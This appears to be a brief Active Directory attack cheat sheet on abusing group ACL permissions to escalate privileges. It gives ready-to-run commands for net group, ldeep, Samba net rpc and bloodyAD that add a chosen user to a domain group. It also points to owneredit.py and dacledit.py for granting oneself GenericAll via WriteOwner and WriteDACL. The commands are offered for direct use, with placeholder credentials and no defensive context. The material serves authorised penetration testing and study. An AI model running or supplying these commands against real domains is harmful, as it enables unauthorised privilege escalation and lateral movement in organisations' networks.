# ACLs/ACEs permissions on Group

### Self (Self-Membership) on Group / GenericAll/WriteProperty on Group/ WriteProperty (Self-Membership)

#### 1) Add group member

    net group "GROUP" MY_USER /add /domain

#### 2) ldeep

    ldeep ldap -u USER -p PASSWORD -d DOMAIN -s ldap://DC add_to_group "CN=USER,DC=DOMAIN" "CN=GROUP,DC=DOMAIN"

#### 3) Linux Net RPC - Samba

    net rpc group addmem "GROUP" "USER" -U domain.local/USER%'Password@1' -S DC_IP

#### 4) BloodyAD

    bloodyAD --host "DC_IP" -d "domain.local" -u "USER" -p "Password@1" add groupMember "GROUP" "USER"

### WriteOwner on Group

#### WriteDACL + WriteOwner. Give yourself Generic All with: owneredit.py and dacledit.py
